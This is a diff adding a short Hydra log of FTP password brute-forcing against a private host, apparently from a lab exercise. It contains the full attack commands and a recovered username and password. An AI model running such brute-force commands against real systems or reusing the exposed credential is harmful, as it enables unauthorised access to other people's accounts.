@@ -1,0 +1,4 @@
+# Hydra v9.2 run at 2025-01-18 00:40:53 on 192.168.168.123 ftp (hydra -L users.txt -P passwords.txt -f -v -o hydra_results.txt ftp://192.168.168.123)
+# Hydra v9.2 run at 2025-01-18 00:52:35 on 192.168.168.123 ftp (hydra -L users.txt -P passwords.txt -s 2121 -f -v -o hydra_results.txt ftp://192.168.168.123)
+[2121][ftp] host: 192.168.168.123   login: kevin01   password: kev54wcc
+# Hydra v9.2 run at 2025-01-19 01:05:49 on 192.168.168.123 ftp (hydra -L users.txt -P passwords.txt -s 2121 -f -v -o hydra_results.txt ftp://192.168.168.123)
